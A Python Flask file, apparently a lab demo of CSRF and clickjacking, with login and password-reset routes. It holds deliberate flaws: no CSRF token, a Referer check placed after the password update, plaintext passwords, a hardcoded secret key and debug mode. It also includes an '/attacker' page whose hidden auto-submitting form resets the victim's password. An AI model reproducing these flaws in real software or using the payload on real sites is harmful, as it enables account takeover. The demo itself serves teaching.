from flask import Flask, render_template, request, redirect, session, url_for, g
import sqlite3

app = Flask(__name__)
app.secret_key = 'demo_secret_key'

DATABASE = 'demo.db'

def get_db():
    db = getattr(g, '_database', None)
    if db is None:
        db = g._database = sqlite3.connect(DATABASE)
    return db

@app.teardown_appcontext
def close_connection(exception):
    db = getattr(g, '_database', None)
    if db is not None:
        db.close()

@app.route('/login', methods=['GET', 'POST'])
def login():
    error = None
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        cur = get_db().cursor()
        cur.execute("SELECT * FROM users WHERE username = ? AND password = ?", (username, password))
        user = cur.fetchone()
        if user:
            session['username'] = username
            return redirect(url_for('home'))
        else:
            error = "Invalid credentials"
    return render_template('index.html', error=error)

@app.route('/home')
def home():
    if 'username' not in session:
        return redirect(url_for('login'))
    return render_template('home.html', username=session['username'])

@app.route('/reset', methods=['GET', 'POST'])
def reset():
    if 'username' not in session:
        return redirect(url_for('login'))

    message = None
    if request.method == 'POST':
        new_pass = request.form.get('new_password')
        confirm_pass = request.form.get('confirm_password')

        if new_pass != confirm_pass:
            message = "Passwords do not match"
            return render_template('reset.html', message=message)
        else:
            db = get_db()
            db.execute("UPDATE users SET password = ? WHERE username = ?", (new_pass, session['username']))
            db.commit()

            referer = request.headers.get('Referer', '')
            if '/reset' not in referer:
                return redirect(url_for('home'))

            message = "Password updated!"
    return render_template('reset.html', message=message)


@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('login'))


@app.route('/attacker')
def attacker():
    return '''
    <h2>Malicious CSRF Page</h2>
    <form action="/reset" method="POST" id="csrfForm">
        <input type="hidden" name="new_password" value="hacked123">
        <input type="hidden" name="confirm_password" value="hacked123">
    </form>
    <script>
        document.getElementById('csrfForm').submit();
    </script>
    '''
#http://127.0.0.1:5000/attacker


@app.route('/clickjack')
def clickjack():
    return render_template('attacker_clickjacking.html')



if __name__ == '__main__':
    app.run(debug=True)